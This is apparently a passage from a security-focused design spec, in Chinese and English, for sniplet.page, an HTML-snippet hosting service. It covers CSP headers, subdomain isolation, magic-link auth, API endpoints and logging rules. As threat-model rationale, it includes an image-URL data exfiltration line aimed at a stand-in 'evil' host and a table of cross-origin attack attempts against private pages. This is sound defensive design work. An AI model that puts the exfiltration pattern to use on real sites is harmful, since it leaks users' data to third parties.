| `sniplet_viewed` | access_mode、auth_status | — | date |
| `auth_request_received` | was_on_whitelist(bool) | — | date |
| `auth_verified` | outcome(success/expired/invalid) | — | date |
| `auth_consumed` | outcome(success/replay/invalid) | — | date |
| `slug_postfix_applied` | retry_count | — | date |
| `rate_limit_hit` | endpoint、scope(per-ip/per-email)、reason | — | date |
| `daily_cap_hit` | — | — | date |
| `auth_global_cap_hit` | — | counter_value | date |
| `resend_send_failed` | error_code(Resend 回傳)、quota_exhausted(bool) | — | date |
| `cron_cleanup_success` | — | deleted_count | date |
| `csp_violation` | directive、blocked_host_hash(SHA-256) | — | date |

**Monitoring alerts**:
- `resend_send_failed` rate > 5% in 5min → ops alert(私享功能可能靜默掛掉)
- 24hr 無 `cron_cleanup_success` → ops alert(過期 sniplet 未清,儲存成本累積)
- `daily_cap_hit` 觸發 → ops alert(評估是否為攻擊 / 需要提升 cap)
- `rate_limit_hit` 單一 IP 爆量 → ops alert
- `csp_violation` > 100/day → ops alert(可能是新 legit CDN 需要加 allowlist,或 abuse 訊號)
- `auth_consumed` outcome=replay > 10/hr → ops alert(magic link 被 scanner / attacker 嘗試 replay)
- `auth_global_cap_hit` 當日首次觸發 → ops alert(F-32;評估是合法成長 → 升 Resend tier + bump cap,或是攻擊 → CF firewall rule 處理)

**查詢方式**:Cloudflare Dashboard → Analytics Engine → SQL API。v1 不做 owner-facing dashboard。

**Privacy 保證**:不記 email 明文、不記 IP、不記 sniplet HTML 內容、不記可識別個人資訊。資料 90 天自動過期。

### 7.19 HTTP Security Headers

所有 sniplet response(`{slug}.sniplet.page/`)、challenge page、apex page 加:

```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=63072000; includeSubDomains
Reporting-Endpoints: csp="https://api.sniplet.page/v1/csp-report"
```

**統一嚴格 CSP**(所有 sniplet 共用,不分 public / private):

```
Content-Security-Policy:
  default-src 'none';
  script-src 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://unpkg.com;
  style-src 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://unpkg.com;
  img-src data: blob:;
  font-src data:;
  media-src data: blob:;
  connect-src 'none';
  form-action 'none';
  frame-src 'none';
  frame-ancestors 'none';
  base-uri 'none';
  object-src 'none';
  report-uri https://api.sniplet.page/v1/csp-report;
  report-to csp
```

**雙 reporting 機制**:`report-uri` 是舊 CSP2 指令(Chrome / Firefox / Edge 仍支援,為向後相容保留);`report-to` + `Reporting-Endpoints` header 為 W3C Reporting API 現行標準,Chrome 已完整支援、其他瀏覽器陸續跟進。兩者並存保證所有 client 都能回報。

**CSP 的兩個職責**:

1. **Per-sniplet sandbox**:限制 creator 上傳的 JS 能做什麼。sniplet 本質是 self-contained snapshot,不該對外發請求
2. **Platform abuse 防線**:防止 sniplet.page 被當 phishing / malware / C2 / 廣告刷量 host

**CSP 不負責 cross-sniplet isolation**:那是 subdomain + SOP 的職責(見 §7.20)。

**為何允許 `'unsafe-inline'`**:AI 產的 HTML 幾乎都是 `<script>const data = {...}; new Chart(ctx, data);</script>` 這種 inline 模式。要求每段 inline 轉成 external src 等同於要求上傳多檔案,違背 single-file HTML 定位。Sniplet 接受「creator 寫的 JS 會執行」作為前提,透過限制能 load 什麼、能 connect 哪裡來 contain,**這是 sandbox 思維而非傳統 XSS 防禦思維**。

**為何 `img-src` 只開 `data: blob:`**:防止 `new Image().src = evil + '?' + data` 這類 img URL exfil。Creator 要顯示圖片必須 base64 嵌入,符合 self-contained 定位。

**為何 CDN allowlist 只有三家**:jsdelivr / cdnjs / unpkg cover 99% 主流 lib(Chart.js、Three.js、D3、Plotly、Tailwind Play、React/Vue CDN 等)。清單越短越好管。

**CSP 違規 reporting**:`report-uri` 指向 api.sniplet.page 的 csp-report endpoint,收到時寫 `csp_violation` event(blocked_host 要 hash 不存明文,見 §7.22)。

**附帶屬性 — Service Worker registration 無法成功**:
- Response content-type 為 `text/html` + `X-Content-Type-Options: nosniff` → browser MIME check 拒絕將 response 當作 SW script
- 刻意屬性:sniplet 的 HTML 試圖 `navigator.serviceWorker.register('/')` 必失敗

API `api.sniplet.page/*` 加同樣 headers(XFO、nosniff、Referrer-Policy、HSTS),外加 CORS(預設拒絕跨域;challenge page 的 cross-origin form POST 需特別處理 — 見 §7.20)。

### 7.20 Subdomain Isolation 與 Session 模型

**架構核心**:每個 sniplet 自己的 subdomain → 每個 sniplet 自己的 origin → browser SOP 天然隔離。

**Cross-sniplet 攻擊被 SOP 擋下的路徑**:

| 攻擊 path | 結果 |
|---|---|
| Eve 的 `eve-a7k2` 裡 JS 發 `fetch('https://alice-private-x9m1.sniplet.page/')` | Cross-origin credentialed fetch;browser 會帶上 cookie 送 request,**但 response body JS 讀不到**(CORS 未開)→ 攻擊失敗 |
| `window.open('https://alice-private-x9m1.sniplet.page/')` | Cross-origin window,讀 `w.document` 直接 DOMException → 攻擊失敗 |
| `<iframe src="https://alice-private-x9m1.sniplet.page/">` | Cross-origin iframe,讀 `contentDocument` 被 SOP 擋;加上 `X-Frame-Options: DENY` 連 iframe 載入本身都擋 → 攻擊失敗 |
| Form submit to another subdomain | Cookie 會帶,但 response 讀不到;sniplet 無 state-mutating viewer endpoint,CSRF 無意義 → 攻擊失敗 |

**SOP 讓跨 sniplet 讀取攻擊在結構上不可行**,不需要 Fetch Metadata / COOP 這類軟體層補丁。

**Session cookie 設計(`Domain=sniplet.page`)**:

- Cookie 發給 `.sniplet.page`,browser 自動附在所有 `*.sniplet.page` + apex 的 request 上
- **`api.sniplet.page` Worker MUST 忽略 `st` cookie**:API 只使用 `Authorization: Bearer <owner_token>`,session cookie 雖被 browser 自動帶到 api subdomain,Worker MUST NOT 讀取、解析、或 log 該 cookie。此為「限縮 attack surface」紀律,cookie 存在於 request header 但 API code path 視其不存在
- UX:一次驗證 email → 跨所有 Alice 有權看的 sniplet 共享 session,不需每個 sniplet 重新驗
- 授權:session cookie `sub` 是 HMAC(email),只證明「持有者曾收到該 email 的 magic link」;每個 sniplet 的 `meta.viewers[].h` 獨立判斷該 HMAC 是否在白名單
- **授權 re-check invariant(MUST)**:每次 GET 私享 sniplet 都**必須**重新 load `meta.viewers[].h` 並比對 cookie 的 `sub`(字串相等);**不得**以「cookie 簽章有效 + 曾通過此 sniplet 檢查」快取授權決定。此 invariant 使 PATCH 移除 viewer 下次即生效(無需 server-side revoke list),也是 v1 沒做 JWT revocation 的依據
- Cookie 跨 subdomain 不等於隔離失效:
  - HttpOnly → sniplet HTML 無法讀 `document.cookie`
  - Cross-origin fetch / window.open / iframe → 被 SOP 擋(見上表)
  - Cookie 送到 Eve 的 subdomain,**被平台 Worker code 處理**,viewer HTML 無權接觸 — 平台 code 不可被 viewer 注入

**Challenge page 的 cross-origin form POST**:

Challenge page 託管在 `{slug}.sniplet.page`,但 auth 統一在 apex `sniplet.page`:

- Challenge page 的 form `action="https://sniplet.page/auth/request"` → cross-origin POST
- Apex `/auth/request` 設 `Access-Control-Allow-Origin: https://{origin-from-request}.sniplet.page`(驗 Origin header 屬於 `*.sniplet.page`)與 `Access-Control-Allow-Credentials: true`
- Browser 做 CORS preflight,通過後送實際 POST
- **或** challenge page 可以直接做 `POST` via fetch with `credentials: 'include'`,cookie 會自動帶(用於後續查 Alice 是否已 verified)

此 CORS 開放僅限 `/auth/request`,其他 api endpoint 仍預設拒絕跨域。

**v2 Team tier 的殘留跨 sniplet 風險**:若未來 `{team}.sniplet.page/{slug}` 形式,team 內所有 sniplet 共用 `{team}.sniplet.page` origin,**team 內部就會回到 v0.8.9 時代的 same-origin 威脅模型**。Team tier 假設「team 內成員互信」,此時需要重新引入 Fetch Metadata / 更嚴 CSP 等軟體層防線(這些機制在 v0.8.10 移除但仍有 know-how 留存)。

### 7.21 TTL 機制
- GET 時 lazy 檢查 `expires_at`,過期回 404(不回 410,避免洩漏「曾存在過」)
- 每日 UTC 02:00 Cron Worker 清理過期 R2 物件 + EMAIL_INDEX_KV 對應條目

### 7.22 Logging Hygiene

Cloudflare Workers 的 `console.log` 與 Analytics Engine 的 `writeDataPoint` 資料可在 dashboard 被查看。以下資料 **MUST NOT** 進入任何 log / analytics event:

| 不記 | 原因 |
|------|------|
| `Authorization` header 的 `owner_token` 內容 | 洩漏 = 第三方可刪 / 改任何 sniplet |
| `Cookie` header(含 session JWT `st`) | 洩漏 = 冒充 viewer;**全部 Worker(含 api、apex、sniplet subdomain)MUST NOT log 整個 `Cookie` header**,即使是 debug / error trace;api Worker 應完全略過 cookie parsing |
| URL query `?t=<magic_token>` | 洩漏 = 15 分鐘內可奪取 session |
| `RESEND_API_KEY`、`TURNSTILE_SECRET`、`SESSION_JWT_SECRET`、`MAGIC_JWT_SECRET`、`EMAIL_HASH_SECRET`、`IP_HASH_SECRET` | 洩漏 = 根本性 compromise |
| Viewer email 明文(`/auth/request` body、PATCH `add`/`remove` body) | 違反隱私原則;這些 endpoint 收到後 MUST 即時 `normalize → HMAC`,後續只處理 HMAC,不保留明文於任何 log / trace |
| Creator IP 明文 | 若要記 abuse,用 HMAC hash |
| Sniplet HTML 內容 | 可能含機密 |
| 任何 request/response body 原文 | 含上述資料的風險 |
| CSP violation report 中的 `blocked-uri` 明文 | 可能含外部 URL 含 query string 含 sensitive data;SHA-256 hash 後再記 |

**允許記錄的**:
- HTTP method、path(去識別化 slug,例如 `/***`)
- Status code、latency
- Error code(machine-readable,如 `invalid_token`)
- Geo country(cf.country)— 供 analytics 用
- Hash 過的 IP / email / slug / blocked-uri(for abuse correlation)

**Analytics Engine `writeDataPoint` 規則**:
- blobs 不放 PII、不放 secrets
- Event 設計前先 review

**CF 平台層 edge log**:
- **CF Log Push 必須未啟用**,或啟用時 `Authorization` header 在 drop list
- Workers Trace 預設會 capture request headers,code 內 `console.log(request.headers)` 也會 — 禁用
- 若 CF edge log 洩漏 owner_token,`/security` page 將此明列為 SEV-1 incident(§10.7)

**如何實作**:
- 所有 `console.log` 集中經過 sanitize helper
- Secrets 用 env binding 存取,不在 code 字串化
- Error handler 捕捉到 exception 時,只 log error type + endpoint,不 log stack trace 中可能含 request 資料的部分
## 8. API Spec

### `POST /v1/sniplets` (via `api.sniplet.page`)

**Request**:
```json
{
  "html": "<!DOCTYPE html>...",
  "slug": "q3-sales-dashboard",
  "viewers": ["alice@co.com", "bob@co.com"]   // optional, null/缺省 = 公開, 上限 3(Free tier)
}
```

**Response 200**:
```json
{
  "slug": "q3-sales-dashboard-a7k2",            // 一律含 postfix
  "url": "https://q3-sales-dashboard-a7k2.sniplet.page",
  "expires_at": "2026-04-25T14:30:00Z",
  "owner_token": "ot_...",
  "access": "public",
  "viewers_masked": ["a***@co.com", "b***@co.com"] | null   // gated 才有;明文 email 不回傳
}
```

**注意**:
- response 的 `slug` / `url` **一律包含 4 字元 postfix**,與 request slug 必定不同。**Client 必須以 response 為準**,不要用 request slug 構造 URL。
- **response 不回明文 email**,只回 `viewers_masked`(格式 `{first-char}***@{domain}`);creator 應自行記得自己加了誰,server 不保留明文可還原(§7.9 F-11)

**Errors**(完整見 §16):
- 400 `invalid_format` / `reserved_slug` / `viewers_exceeded` / `viewers_empty`
- 429 `rate_limited`(per-IP 超過 50/day)
- 451 `blocked_content`
- 500 `slug_retry_exhausted`
- 503 `daily_cap_exceeded`(全站 1000/day)

### Owner 操作驗證順序(F-33,v0.8.12 — PATCH / DELETE 共用)

為防 slug enumeration oracle(`401 invalid_token` vs `404 not_found` 的 free oracle),兩個 owner endpoint MUST 遵循以下順序:

1. 讀 R2 `meta.json`
2. **Constant-time 比對** owner_token hash:
   - 若 meta 不存在(slug 無效)→ 用預先計算好的 **dummy hash** 跑一次 constant-time 比對,讓 latency 與 slug 存在時一致
   - 若 meta 存在但 hash 不符 → 不通過
3. 上述 2 中任一不通過 → 統一回 `401 invalid_token`(**不**區分「slug 不存在」與「token 錯」)
4. 通過後再檢 `expires_at`,過期回 `410 expired`(**僅在此階段可見**,已是 valid owner)
5. 執行實際 DELETE / PATCH 邏輯

**此設計影響**:真正 owner 若打錯 slug,會收到 401 而非 404;v1 接受此 debug 體驗退化作為 enumeration 防護的代價。

### `PATCH /v1/sniplets/:slug/viewers`
**Header**: `Authorization: Bearer <owner_token>`

**Request**:
```json
{
  "add": ["carol@co.com"],     // optional
  "remove": ["bob@co.com"]     // optional
}
```

**Response 200**:
```json
{
  "viewers_masked": ["a***@co.com", "c***@co.com"] | null,
  "access": "public" | "email-gated"
}
```

**語意**:
- creator 自由切換 public / email-gated。Remove 到空 → 回 public(`viewers_masked: null`)。因為 CSP 不分 access mode 統一嚴格,**切換不會影響 HTML 行為**。
- **明文 email 永不回傳**;`remove` 時 server 對輸入 email 做 `normalize → HMAC`,再與 `meta.viewers[].h` 比對移除。若某 email 的 HMAC 不在白名單,該項靜默略過(不洩漏「該 email 從未加過」)。
- `add` 時 server 同樣 `normalize → HMAC`,若已存在則不重複加。

**Side effects**:更新 EMAIL_INDEX_KV。

**Errors**(完整見 §16):
- 400 `invalid_format` / `viewers_exceeded` / `empty_request`
- 401 `invalid_token`(token 缺失 / 錯誤 / slug 不存在 — 統一為 unauthorized,F-33)
- 410 `expired`(僅在 valid token 驗證通過後可能回傳)

### `DELETE /v1/sniplets/:slug`
**Header**: `Authorization: Bearer <owner_token>`
**Side effects**:刪 R2、清 EMAIL_INDEX_KV
**Response**: 204 No Content

**Errors**(完整見 §16):
- 401 `invalid_token`(token 缺失 / 錯誤 / slug 不存在 — 統一為 unauthorized,F-33)
- 410 `expired`(僅在 valid token 驗證通過後可能回傳)

### `GET /` on `{slug}.sniplet.page`

1. Worker 從 `request.url.hostname` 解析 slug
2. 讀 R2 meta.json → 檢 TTL(過期回 404)
3. **公開**(`meta.viewers === null`)→ serve HTML + 統一嚴格 CSP + 其他 security headers
4. **私享**(`meta.viewers !== null`):
   - 無 cookie → 回 challenge page(HTTP 200)
   - 有 cookie → 驗 session JWT(強制 `purpose === "session"`)→ 比對 viewers → 通過則 serve,不通過回 challenge page
5. 不存在 → 404

**Cache-Control**:一律 `no-store`(v0.8.10 移除 edge cache)

### `GET /` on apex `sniplet.page`
- Accept 含 `text/html` → 回內嵌 HTML 簡頁
- 其他(curl、agent) → 回 `text/plain` 的 SKILL.md 原文

### `POST /auth/request` (apex)
**Request**:
```json
{ "email": "alice@co.com", "return_to": "https://q3-private-m8f1.sniplet.page/", "turnstile_token": "..." }
```

**CORS**:
- `Access-Control-Allow-Origin`:動態鏡射 request 的 `Origin`,但**僅當** Origin 符合 `^https://[a-z0-9](?!.*--)[a-z0-9-]{6,43}[a-z0-9]\.sniplet\.page$`(對應 postfixed slug 長度 8–45 字元,與 §8 `return_to` 驗證 regex 一致)
- `Access-Control-Allow-Credentials: true`
- OPTIONS preflight 支援

**實作要點**:
1. 驗 Turnstile → fail 回 400 `turnstile_failed`
2. 檢 per-email rate limit(3/hr、10/day)+ per-IP rate limit(30/day per /64)→ fail 回 429 `rate_limited`
3. **Peek 全站 send cap(F-32,v0.8.12)**:`METER_KV.get('auth_send_daily:<UTC-date>')` ≥ cap → 503 `service_unavailable`。**必須在步驟 4 之前**,以保 hit / miss 兩 path 都看到同一判斷(不 leak whitelist)
4. normalize email(trim + lowercase)→ HMAC → KV lookup
5. 若 hit:**`ctx.waitUntil(async () => { await resend.send(...); await incrementAuthSendCounter() })`**,response 立刻返回,不等 Resend;counter +1 僅在實際 send path 發生
6. 若 miss:silently skip,response 立刻返回
7. **兩個 path latency 差 < 5ms**,消除 timing side channel

**Response**:
- 通過 Turnstile + rate limit + send cap → 200 `{ "status": "sent" }`(不論 email 在不在白名單)
- Turnstile 失敗 → 400 `turnstile_failed`
- Rate limit 超過 → 429 `rate_limited`
- 全站 send cap 達到 → 503 `service_unavailable`(F-32)

**為何一定要 `ctx.waitUntil`**:若同步呼叫 Resend,hit path 延遲 200-500ms,miss path 延遲 ~50ms。Attacker 量 timing 即可區分 email 是否在白名單,完全繞過 Strategy C。`ctx.waitUntil` 是 CF Workers 原生支援的 defer 機制,response 不等 promise 完成。

### `GET /auth/verify?t=<token>&r=<return_to>` (apex) — 確認頁,**不 consume token**

**步驟**:
1. **不驗 token、不 consume、不 set cookie**
2. 回傳 HTML 確認頁,顯示:「You're about to sign in to view a sniplet. Click Continue to proceed.」
3. 頁面內含:
   - 一個 `<button id="continue">` Continue button
   - Inline JS:點擊時 `POST /auth/consume { t, r }` with `credentials: 'include'`,response 拿到 `{ redirect }` 後 `window.location = redirect`
   - 不 reveal `t` 值給 DOM(放在 JS closure 內)
4. 確認頁 response 加 `Cache-Control: no-store`

**為何這樣設計**:防止 email security scanner(Microsoft Defender Safe Links、Google Workspace 等)自動 GET `/auth/verify` 時意外 consume 掉 token。Scanner 做 GET,看到 HTML 確認頁就結束,不會模擬 button click + POST。

### `POST /auth/consume` (apex) — 實際 verify + set cookie

**Request**:
```json
{ "t": "<magic-jwt>", "r": "<return_to>" }
```

**步驟**:
1. 驗 magic JWT(`MAGIC_JWT_SECRET` 驗簽 + `purpose === "magic"` + `exp` 未過期 + algorithm MUST === `HS256`)
2. 檢查 `MAGIC_CONSUMED_KV[jti]`:
   - 存在 → 回 422 `already_consumed`
   - 不存在 → 寫入 `MAGIC_CONSUMED_KV[jti] = 1`,TTL 16 分鐘
3. 驗 `return_to`(§8 驗證邏輯)— 失敗則 `return_to` 視為 `https://sniplet.page/`
4. 簽 session JWT(`SESSION_JWT_SECRET`,`purpose: "session"`)
5. `Set-Cookie: st=<jwt>; HttpOnly; Secure; SameSite=Lax; Domain=sniplet.page; Path=/; Max-Age=2592000`
   - **Domain=sniplet.page**:cookie 跨 `*.sniplet.page` + apex 共享,支援 §5 情境 E 的 session 重用
6. 回 200 `{ "redirect": "<return_to>" }`

**Errors**:
| HTTP | Error | 觸發 |
|---|---|---|
| 400 | `invalid_format` | body 結構錯 |
| 401 | `invalid_token` | JWT 簽章 / purpose / algorithm 不符 |
| 410 | `token_expired` | JWT exp 過期 |
| 422 | `already_consumed` | jti 已在 KV 中 |

**return_to 嚴格驗證邏輯**(防 open redirect):
```ts
function validateReturnTo(r: string): boolean {
  // MUST:
  // 1. 不為空
  // 2. 可解析為 URL(absolute)
  // 3. protocol === 'https:'
  // 4. hostname === 'sniplet.page' OR hostname 匹配 {slug}-{postfix}.sniplet.page 格式
  // 5. pathname === '/'
  // 6. 無 query string、無 fragment
  
  try {
    const url = new URL(r);
    if (url.protocol !== 'https:') return false;
    if (url.search || url.hash) return false;
    if (url.pathname !== '/') return false;
    if (url.hostname === 'sniplet.page') return true;
    // 匹配 {slug}.sniplet.page 格式(slug 含 postfix,長度 8–45 字元)
    return /^[a-z0-9](?!.*--)[a-z0-9-]{6,43}[a-z0-9]\.sniplet\.page$/.test(url.hostname);
  } catch {
    return false;
  }
}
```

驗證失敗 → `return_to` 設為 `https://sniplet.page/`(不 leak 原因,不 error)。

### `POST /auth/logout` (apex)
**目的**:主動結束 session,清除 cookie。

**Request**:無 body(cookie 會自動帶)

**CSRF 防護(MUST,v0.8.11 S-6)**:
- 必驗 `Origin` header;符合以下兩條任一才處理,否則回 `400 invalid_origin`:
  - `Origin === "https://sniplet.page"`(從 apex page 或 Challenge page 呼叫 — 跨 origin 但在自家)
  - `Origin` 符合 `^https://[a-z0-9](?!.*--)[a-z0-9-]{6,43}[a-z0-9]\.sniplet\.page$`(從合法 sniplet subdomain,含 postfix 格式)
- 理由:`SameSite=Lax` 不擋 logout CSRF(`Set-Cookie: Max-Age=0` 無條件清 cookie,即使請求不帶舊 cookie);Origin check 是最低成本有效防線
- **瀏覽器 POST 100% 帶 Origin**,合法 logout 不會被誤擋;v1 無 mobile / server-to-server 呼叫 logout 的場景

**Response**:
- 200 `{ "status": "logged_out" }`
- `Set-Cookie: st=; HttpOnly; Secure; SameSite=Lax; Domain=sniplet.page; Path=/; Max-Age=0`

**備註**:v1 不做 server-side JWT revocation(其他 device 上的 cookie 仍 valid 至 30 天 exp)。見 §12 風險 F-29(v0.8.11 新增)討論 cookie 外洩情境;裝置遺失的 nuclear 選項是 `SESSION_JWT_SECRET` 輪換(RUNBOOK §2.2),v2 評估 JWT revoke list。

## 9. Email Template 規格

**主旨**(通用版,不含 slug 名稱):`Sign in to sniplet.page`

**純文字版**:
```
Someone shared a sniplet with you on sniplet.page.

View it here:
{verify_url}

This link expires in 15 minutes and can only be used once.
If you didn't request this, safely ignore this email.

— sniplet.page
```

**HTML 版**(B「乾淨有品」):
- 系統字、最大寬度 560px、居中
- 純文字 logo 在頂部
- 一段說明文字 + button style `<a>`
- 分隔線 + 15 分鐘 + one-time use 說明 + 忽略提示
- 底部 footer 小字「sniplet.page」
- 無 logo 圖檔、無 unsubscribe(transactional 不需要)、無 dark mode(v2)
- **不提 slug 名稱**(信件可能被轉寄、截圖)

## 10. Platform Pages(平台產的頁面總覽)

本節定義所有由平台 Worker 產生的頁面。Creator 上傳的 sniplet HTML 不在此範圍(那是 creator 的內容,平台只加 security headers)。

### 10.1 總覽

平台產 6 類頁面。三個私享流程會遇到,一個是產品入口,兩個是公開的 security policy。

| 頁面 | URL | 觸發 | Turnstile | 詳述 |
|---|---|---|---|---|
| **Apex root** | `sniplet.page/` | GET,Accept header 分流 | ❌ | §10.2 |
| **Challenge page** | `{slug}.sniplet.page/` | 私享 sniplet + 未通過授權 | ✅ | §10.3 |
| **確認頁(verify page)** | `sniplet.page/auth/verify?t=...&r=...` | Viewer 點 email 中的連結 | ❌ | §10.4 |
| **404 page** | 多處 | 不存在 / 過期 sniplet | ❌ | §10.5 |
| **Security policy** | `sniplet.page/security` | 安全研究者 | ❌ | §10.7 |
| **security.txt** | `sniplet.page/.well-known/security.txt` | 自動化工具(RFC 9116) | ❌ | §10.8 |

**Turnstile 決策邏輯**:

- **Challenge page 要 Turnstile**:擋 `/auth/request` 濫用(暴力 email 嘗試、打爆 Resend、email enumeration timing attack)。這是對匿名 POST 的合理防護。
- **確認頁不要 Turnstile**:`/auth/consume` 已有多層防護 — attacker 必須先持有 valid magic JWT(只寄給白名單 email)、token 15 分鐘過期、one-shot(`MAGIC_CONSUMED_KV` 擋 replay)、session cookie 各 sniplet 白名單獨立判斷。再加 Turnstile 只增加 UX 摩擦,零安全收益。

**共同屬性**:
- 所有平台頁面皆回 `Cache-Control: no-store`
- 所有平台頁面加統一 security headers(§7.19)— 但 **CSP 略有不同**:Challenge page 與確認頁需要額外允許 Turnstile 的 domain(`https://challenges.cloudflare.com`);sniplet page serve creator HTML 用主 CSP
- 系統字、RWD、v1 僅英文,v2 加中文
- 不含品牌 logo 圖檔、社群連結、廣告、追蹤

### 10.2 Apex root(`sniplet.page/`)

**目的**:產品入口與 AI agent 的 skill 取得點。

**分流邏輯**:
- Request header `Accept` 含 `text/html` → 回人類可讀的產品簡頁
- 其他(curl、agent、`Accept: */*` without html)→ 回 `text/plain` 的 SKILL.md 原文

**HTML 版內容**:
- 品牌 `sniplet.page`
- 一句 tagline:`Share AI-generated HTML as a URL. Public or private. No account needed.`
- 三步驟說明
- "Using AI agents?" 區塊連到 GitHub repo 的 SKILL.md
- Security policy 連結 → `/security`(§10.7)
- Known Issues / Advisories(SEV 事件時 operator 手動更新)

### 10.3 Challenge page

**觸發**:GET `{slug}.sniplet.page/` 且 `meta.viewers ≠ null`,且:無 cookie / cookie 無效 / cookie 的 `sub`(HMAC)不在 `meta.viewers[].h` 白名單。

**HTTP 行為**:回 `200 OK` + HTML(**不**回 401 / 403 — HTTP status 不區分 access mode,避免透過 status code 洩漏 sniplet 私享性質)

**Known limitation**:雖然回 200,challenge page 文案「This sniplet is private」本身即揭示此 sniplet 為私享。Attacker 枚舉可區分三態(回公開 HTML / 回 challenge page / 回 404)。真正 unified 需讓公開 sniplet 也走 "click to view" interstitial(UX 倒退,不划算)。v1 接受此 trade-off;真正敏感的 sniplet slug 應避免語義化命名。**永遠加 postfix 本身已部分 mitigation**(attacker 不能精準搜尋 brand-named slug)。

**UI 元素**:
- 純文字品牌:`sniplet.page`
- 標題:`This sniplet is private`
- 說明:`Enter your email to request access.`
- Email input(required,type=email)
- Cloudflare Turnstile widget
- Submit button:`Send magic link`
- 提示:`A magic link will be sent if you're on the viewer list. Click the link, then Continue to view.`
- 底部 footer:`This sniplet expires in N days`(倒數 TTL 剩餘,server-side 計算)

**提交行為**:Inline JS → cross-origin `fetch POST https://sniplet.page/auth/request` with `credentials: 'include'` + `Content-Type: application/json`,body 含 `{ email, return_to, turnstile_token }`。依 response 切 UI:
- 200 → `If this email is authorized, a magic link has been sent. Check your inbox.`
- 400 `turnstile_failed` → `Please complete the verification and try again.`
- 429 `rate_limited` → `Too many attempts. Please try again later.`
- 503 `service_unavailable` → `Service is temporarily busy. Please try again in a few minutes.`(F-32)

**CSP 例外**:此頁面的 CSP 需額外允許 `script-src https://challenges.cloudflare.com`(Turnstile widget JS)與 `frame-src https://challenges.cloudflare.com`(Turnstile iframe)。

**樣式**:系統字、最大寬度 420px、居中、灰底白卡、RWD 手機優先。

### 10.4 確認頁(verify page)

**觸發**:GET `sniplet.page/auth/verify?t=<magic-jwt>&r=<return_to>`,由 viewer 點 email 中的連結觸發。

**HTTP 行為**:永遠回 `200 OK` + HTML。**此頁面的 Worker handler 不驗證 token、不 consume、不 set cookie**,純粹顯示。

**為何兩段式**:防止 email security scanner(Microsoft Defender Safe Links、Google Workspace、某些企業 email gateway)在 email 到達收件匣前 / click 前自動 GET URL 做安全檢查時意外 consume 掉 token。Scanner 看到 HTML 確認頁就結束,不會模擬「使用者點 button」這個互動 → POST `/auth/consume` 不會被觸發。

**UI 元素**:
- 純文字品牌:`sniplet.page`
- 標題:`Continue to view your sniplet`
- 說明:`You're about to sign in to sniplet.page.`
- Continue button
- 小字提示:`This link expires in 15 minutes and can only be used once.`
- **不顯示** sniplet slug 名稱 / return_to URL 明文(避免社交工程時被 screenshot 利用)

**提交行為**:Inline JS 從 URL query 讀出 `t` 與 `r`(不放 DOM,用 closure),button click → `fetch POST /auth/consume { t, r }` with `credentials: 'include'`。依 response:
- 200 `{ redirect }` → `window.location = redirect`
- 401 `invalid_token` / 410 `token_expired` / 422 `already_consumed` → 顯示對應錯誤訊息,提示使用者重新申請(回 challenge page)

**無 Turnstile**:見 §10.1 決策說明。

**CSP**:此頁面不需要外部 script CDN,可用最嚴 CSP(只 `'unsafe-inline'` 給自己的 inline script)。

**樣式**:系統字、最大寬度 420px、居中、灰底白卡,視覺上與 challenge page 同風格,降低 Alice 的認知負擔。

### 10.5 404 page

**觸發**:
- GET `{slug}.sniplet.page/` 但 slug 在 R2 找不到 / 已過期(§7.21)
- Apex 上打到 reserved path 但無 handler
- API 上打到未定義 endpoint(API 404 回 JSON,不是 HTML)

**HTTP 行為**:`404 Not Found` + HTML

**UI 元素**:
- 純文字品牌:`sniplet.page`
- 標題:`Not found`
- 說明:`This sniplet doesn't exist, or it has expired.`
- 連回 `sniplet.page/` 的 link

**為何過期也是 404(非 410)**:見 §7.21 / F-9。避免 attacker 透過 `404 vs 410` 區分「slug 從未存在」vs「slug 曾存在但過期」— 讓 slug 枚舉攻擊拿不到任何訊號。

**CSP**:最嚴 CSP(無外部依賴)。

### 10.6 錯誤頁與 flash message 風格

所有錯誤訊息走 **inline 顯示**(在 button / form 旁邊),不跳 alert / modal。
統一口吻:**簡潔、不責備、可行動**。

- Bad: `Error 401: Invalid token`
- Good: `This link is no longer valid. Please request a new magic link.`

Operator 可 Slack / GitHub 回報文案 bug。

### 10.7 Security policy(`sniplet.page/security`)

**目的**:公開安全政策,給研究者與自動化工具尋找的回報入口。即使 sniplet.page 的 code 非 open source,public service 仍需要透明的漏洞回報管道。apex root 頁面會連到這裡。

**HTTP 行為**:`GET /security` → `200 text/html`,`Cache-Control: public, max-age=3600`(這頁更新頻率低,可 cache)

**UI 元素(英文)**:

- 純文字品牌 `sniplet.page`
- 標題:**Security Policy**
- 簡介(約一段):`sniplet.page takes security seriously. This page describes how to report vulnerabilities and what we consider in scope.`
- **Reporting a vulnerability**:
  - Email:`security@sniplet.page`
  - 嚴重問題在主旨加 `URGENT`
  - 目標 72 小時內回覆
  - 請包含:issue 描述、reproduce 步驟 / PoC、預期影響、建議 mitigation
  - 請勿在我們修復前公開揭露;我們會協調 disclosure 時程
- **Scope**:
  - In scope:`sniplet.page`、`api.sniplet.page`、所有 `*.sniplet.page`、sniplet 後端(auth、access control、rate limiting、資料處理)、sniplet skill(SKILL.md,frontmatter `sniplet-page-share`)— 若洩漏 secrets 或促成攻擊、公開 code(若有發佈)、**`owner_token` 透過 CF edge log pipeline 外洩(SEV-1)**
  - Out of scope:user 自上傳的 HTML 內容(設計上允許任意 HTML;但**cross-sniplet exfiltration 在 scope 內**,即使 SOP 應能擋下)、第三方服務(Cloudflare、Resend、Turnstile)、ordinary traffic DoS(CF 邊緣處理)、social engineering、physical security、受害者裝置已 compromise 的攻擊、Turnstile CAPTCHA bypass
- **What we consider a vulnerability(列點)**:Cross-sniplet data leakage、Authentication bypass、Email whitelist enumeration、IP / email de-anonymization、Account takeover via magic link、Magic link consumption by email scanners、Owner token compromise、Open redirect、XSS in platform-generated pages、CSP bypass、Cryptographic weaknesses
- **Disclosure timeline expectations**:
  - 72 小時:acknowledgement
  - 14 天:初步 assessment + severity 分類
  - 90 天:default maximum time to fix
  - Public disclosure:協調後揭露;若研究者同意,於 GitHub release notes 致謝
- **Safe harbor**:對 good-faith 遵守本政策的研究者不追訴。須遵循:不存取 / 修改超過 demonstrate 漏洞所需的資料、不在修復前公開、不干擾其他使用者

**CSP**:最嚴 CSP(無外部依賴),與 §10.5 404 page 相同。
